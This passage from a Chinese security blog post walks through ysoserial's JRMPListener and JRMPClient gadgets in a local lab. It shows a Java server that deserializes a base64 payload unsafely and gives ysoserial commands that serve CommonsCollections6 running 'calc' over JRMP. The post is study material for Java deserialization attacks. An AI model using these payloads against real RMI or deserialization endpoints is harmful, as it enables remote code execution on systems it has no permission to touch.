class="code"><pre><span class="line"><span class="keyword">package</span> JRMPTest;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> <span class="string">&quot;rO0ABXNyACJzdW4ucm1pLnNlcnZlci5BY3RpdmF0aW9uR3JvdXBJbXBsT+r9SAwuMqcCAARaAA1n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;cm91cEluYWN0aXZlTAAGYWN0aXZldAAVTGphdmEvdXRpbC9IYXNodGFibGU7TAAHZ3JvdXBJRHQA&quot;</span> +</span><br><span class="line">                <span class="string">&quot;J0xqYXZhL3JtaS9hY3RpdmF0aW9uL0FjdGl2YXRpb25Hcm91cElEO0wACWxvY2tlZElEc3QAEExq&quot;</span> +</span><br><span class="line">                <span class="string">&quot;YXZhL3V0aWwvTGlzdDt4cgAjamF2YS5ybWkuYWN0aXZhdGlvbi5BY3RpdmF0aW9uR3JvdXCVLvKw&quot;</span> +</span><br><span class="line">                <span class="string">&quot;BSnVVAIAA0oAC2luY2FybmF0aW9uTAAHZ3JvdXBJRHEAfgACTAAHbW9uaXRvcnQAJ0xqYXZhL3Jt&quot;</span> +</span><br><span class="line">                <span class="string">&quot;aS9hY3RpdmF0aW9uL0FjdGl2YXRpb25Nb25pdG9yO3hyACNqYXZhLnJtaS5zZXJ2ZXIuVW5pY2Fz&quot;</span> +</span><br><span class="line">                <span class="string">&quot;dFJlbW90ZU9iamVjdEUJEhX14n4xAgADSQAEcG9ydEwAA2NzZnQAKExqYXZhL3JtaS9zZXJ2ZXIv&quot;</span> +</span><br><span class="line">                <span class="string">&quot;Uk1JQ2xpZW50U29ja2V0RmFjdG9yeTtMAANzc2Z0AChMamF2YS9ybWkvc2VydmVyL1JNSVNlcnZl&quot;</span> +</span><br><span class="line">                <span class="string">&quot;clNvY2tldEZhY3Rvcnk7eHIAHGphdmEucm1pLnNlcnZlci5SZW1vdGVTZXJ2ZXLHGQcSaPM5+wIA&quot;</span> +</span><br><span class="line">                <span class="string">&quot;AHhyABxqYXZhLnJtaS5zZXJ2ZXIuUmVtb3RlT2JqZWN002G0kQxhMx4DAAB4cHcSABBVbmljYXN0&quot;</span> +</span><br><span class="line">                <span class="string">&quot;U2VydmVyUmVmeAAAHmFwcAAAAAAAAAAAcHAAcHBw&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 解码Base64字符串</span></span><br><span class="line">            <span class="type">byte</span>[] decodedBytes = Base64.getDecoder().decode(base64String);</span><br><span class="line">            <span class="comment">// 反序列化</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">deserializedObject</span> <span class="operator">=</span> deserialize(decodedBytes);</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(System.currentTimeMillis());</span><br><span class="line">            Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">             <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais)) &#123;</span><br><span class="line">            <span class="keyword">return</span> ois.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>调用栈如下<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1720250676413-738857cb-6c31-460e-bb3f-cec122401b12.png#averageHue=%234b5449&clientId=u33ab5c00-e844-4&from=paste&height=396&id=ud7484f10&originHeight=742&originWidth=928&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=451617&status=done&style=none&taskId=u8b11ef8c-54ee-4ee8-b201-727f019ff3e&title=&width=494.93333333333334" referrerpolicy="no-referrer" alt="image.png"><br>然后再去试着用 yso 中的 JRMPClient 打一下<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1720250902013-c5cbb8c0-7d83-4f50-a610-93b95658dbd6.png#averageHue=%23313236&clientId=u33ab5c00-e844-4&from=paste&height=598&id=u7a96d04f&originHeight=1121&originWidth=1359&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=136004&status=done&style=none&taskId=ue65ac826-46df-4f0d-abde-13bca44aed2&title=&width=724.8" referrerpolicy="no-referrer" alt="image.png"><br>攻击效果如下<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1720250962062-32e537b8-54da-4d9d-b24e-ece10353723a.png#averageHue=%23333735&clientId=u33ab5c00-e844-4&from=paste&height=725&id=u70341f2a&originHeight=1360&originWidth=2552&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=1058570&status=done&style=none&taskId=ue818de93-8823-43d1-bdb6-932228871c0&title=&width=1361.0666666666666" referrerpolicy="no-referrer" alt="image.png"></p>
+<h2 id="JRMPClient"><a href="#JRMPClient" class="headerlink" title="JRMPClient"></a>JRMPClient</h2><p>那 JRMPClient 的 Gadgets 也是如此使用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar target/ysoserial-<span class="number">0.0</span><span class="number">.6</span>-SNAPSHOT-all.jar JRMPClient <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">7777</span>|base64</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1720251129976-ca9e8af9-5738-4266-8ca7-72e2ea5bb56f.png#averageHue=%230f1419&clientId=u33ab5c00-e844-4&from=paste&height=108&id=u210c9483&originHeight=202&originWidth=1841&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=76068&status=done&style=none&taskId=u25ab3b19-4df2-492a-9990-72810901377&title=&width=981.8666666666667" referrerpolicy="no-referrer" alt="image.png"><br>然后开启 JRMPListener<br><code>java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar JRMPListener 7777 CommonsCollections6 calc</code><br>再模拟一次反序列化触发该 Gadgets<br>攻击效果如下<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1720251214328-f133a839-8c70-430a-81b0-4b0108c62763.png#averageHue=%232b2d2e&clientId=u33ab5c00-e844-4&from=paste&height=725&id=ue8b171cc&originHeight=1360&originWidth=2552&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=1125840&status=done&style=none&taskId=u10c806d8-a3da-4c9c-8001-7f0c8b803dd&title=&width=1361.0666666666666" referrerpolicy="no-referrer" alt="image.png"></p>
+<h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p>关于 RMI 中两端（客户端 服务端）互打的具体实现，以及在实战时的攻击操作学习。重新过了一遍 RMI 的流程，更加清晰了，suki~</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/post/Scala%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2024-08-09 18:24:25
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/JRMP/" title="JRMP">
+                        #JRMP
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/post/%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF.html" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RMI-%E8%BF%87%E7%A8%8B%E5%9B%9E%E9%A1%BE"><span class="toc-text">RMI 过程回顾</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JRMPListener-%E8%B0%83%E8%AF%95"><span class="toc-text">JRMPListener 调试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E6%94%BB%E5%87%BB%E6%93%8D%E4%BD%9C%E7%A4%BA%E4%BE%8B"><span class="toc-text">初步攻击操作示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JRMPListener-%E9%80%BB%E8%BE%91"><span class="toc-text">JRMPListener 逻辑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A2%AB%E6%94%BB%E5%87%BB%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%80%BB%E8%BE%91"><span class="toc-text">被攻击客户端逻辑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JRMPClient-%E8%B0%83%E8%AF%95"><span class="toc-text">JRMPClient 调试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DGC-%E5%88%9B%E5%BB%BA%E8%BF%87%E7%A8%8B"><span class="toc-text">DGC 创建过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DGC-%E5%A4%84%E7%90%86%E6%9C%8D%E5%8A%A1%E9%80%BB%E8%BE%91"><span class="toc-text">DGC 处理服务逻辑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JRMPClient-%E9%80%BB%E8%BE%91"><span class="toc-text">JRMPClient 逻辑</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JRMPListener-Client-Gadget"><span class="toc-text">JRMPListener&#x2F;Client Gadget</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JRMPListener"><span class="toc-text">JRMPListener</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JRMPClient"><span class="toc-text">JRMPClient</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-text">总结</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+  <div id="gitalk-container"></div>
+
+  <script>
+    function loadGitalkSuc() {
+      const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: '',
+        owner: '',
+        admin: [''],
+        id: location.pathname,
+        distractionFreeMode: false
+      })
+
+      gitalk.render('gitalk-container')
+    }
+  </script>
+  
+    <link rel="stylesheet" href="/plugins/gitalk.css">
+    <script type="text/javascript" src="/plugins/gitalk.min.js" onload="loadGitalkSuc(this)"></script>
+  
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" href="">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        Copyright © 2024 Oranges
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        Theme by Oranges | Powered by Hexo
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Ysoserial-JRMPListener%2FJRMPClient%E5%AD%A6%E4%B9%A0 + '&url=' + http%3A%2F%2Fexample.com%2Fpost%2FJRMPListener%2520Client%25E5%25AD%25A6%25E4%25B9%25A0.html + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/post/JRMPListener%20Client%E5%AD%A6%E4%B9%A0.html" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
